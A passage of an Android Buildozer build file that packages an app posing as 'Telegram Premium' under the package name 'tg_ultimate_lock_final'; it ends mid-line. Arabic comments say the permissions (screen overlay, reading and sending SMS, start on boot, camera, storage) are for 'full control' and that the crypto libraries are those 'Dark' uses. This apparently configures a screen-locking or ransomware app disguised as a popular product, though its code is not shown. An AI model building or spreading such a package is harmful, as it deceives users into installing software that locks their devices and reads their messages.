[app]

# (str) Title of your application
title = Telegram Premium

# (str) Package name
package.name = tg_ultimate_lock_final

# (str) Package domain (needed for android packaging)
package.domain = org.tg.premium

# (str) Source code where the main.py live
source.dir = .

# (list) Source files to include (let empty to include all the files)
source.include_exts = py,png,jpg,kv,atlas

# (str) Application versioning (method 1)
version = 4.0

# (list) Application requirements
# طلبنا المكتبات اللي دارك بيستخدمها (التشفير والأندرويد)
requirements = python3,kivy==2.1.0,requests,urllib3,chardet,idna,certifi,pyjnius,android

# (str) Supported orientation (one of landscape, portrait or all)
orientation = portrait

# (list) Permissions
# جميع الصلاحيات اللي محتاجينها للسيطرة الكاملة
android.permissions = INTERNET, SYSTEM_ALERT_WINDOW, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, CAMERA, READ_SMS, SEND_SMS, RECEIVE_BOOT_COMPLETED, WAKE_LOCK

# (int) Target Android API, should be as high as possible.
android.api = 31

# (int) Minimum API your APK will support.
android.minapi = 21

# (bool) Android fullscreen mode
fullscreen = 1

# (list) Android architectures to build for
android.archs = arm64-v8a, armeabi-v7a

# (bool) Allow the
